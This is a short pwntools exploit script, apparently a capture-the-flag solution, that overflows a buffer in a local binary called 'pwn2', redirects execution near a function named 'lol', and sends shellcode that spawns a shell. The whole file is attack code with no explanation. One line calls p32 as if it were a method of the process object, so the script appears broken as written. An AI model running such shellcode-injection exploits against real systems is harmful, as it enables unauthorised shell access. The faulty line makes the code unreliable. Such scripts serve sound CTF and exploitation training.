from pwn import *

p = process("./pwn2")
e = ELF("./pwn2")

p.send(b"A" * 44)
p.p32(e.functions["lol"].address + 3)
p.send(asm(shellcraft.sh()))
p.sendline()

p.interactive()
